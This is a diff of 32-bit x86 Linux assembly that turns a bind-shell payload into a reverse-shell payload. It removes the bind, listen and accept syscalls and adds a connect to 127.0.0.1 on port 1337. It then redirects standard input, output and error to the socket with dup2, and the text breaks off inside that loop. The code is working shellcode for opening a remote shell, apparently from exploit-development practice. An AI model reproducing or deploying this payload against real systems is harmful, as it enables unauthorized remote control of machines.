@@ -1,5 +1,7 @@
+BITS 32
+
 section .text:
-    global _start
+global _start
 
 _start:
     ; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
@@ -20,14 +22,13 @@ _start:
 
     ; set up addr struct
     xor     eax, eax
-    push    eax         ; sin_addr = INADDR_ANY
-    ;push    0x0100007f
+    push    0x0100007f
     push    word 0x3905 ; sin_port = htons(1337)
     push    word 0x02   ; sin_family = AF_INET
     push    esp
     pop     edx
 
-    ; bind(sockfd, addr, 16)
+    ; connect(sockfd, addr, 16)
     push    0x16        ; 16
     push    edx         ; &addr
     push    esi         ; sockfd
@@ -35,43 +36,16 @@ _start:
     pop     ecx
 
     mov     al, 0x66    ; sys_socketcall
-    mov     bl, 0x02    ; sys_bind
+    mov     bl, 0x03    ; sys_connect
     int     0x80
     pop     eax
     pop     eax
-    pop     eax
-    pop     eax
-    pop     eax
-
-    ; listen(sockfd, 1)
-    push    0x01        ; 1
-    push    esi         ; sockfd
-    push    esp
-    pop     ecx
-
-    mov     al, 0x66    ; sys_socketcall
-    mov     bl, 0x04    ; sys_listen
-    int     0x80
-    pop     eax
-    pop     eax
-
-    ; accept(sockfd, NULL, NULL)
-    xor     eax, eax
-    push    eax         ; NULL
-    push    eax         ; NULL
-    push    esi         ; sockfd
-    push    esp
-    pop     ecx
-
-    mov     al, 0x66    ; sys_socketcall
-    mov     bl, 0x05    ; sys_accept
-    int     0x80
-    mov     ebx, eax
     pop     eax
     pop     eax
     pop     eax
 
     ; dup2(sockfd, 0), dup2(sockfd, 1), dup2(sockfd, 2)
+    mov     ebx, esi
     xor     ecx, ecx
 loop:
     xor     eax, eax
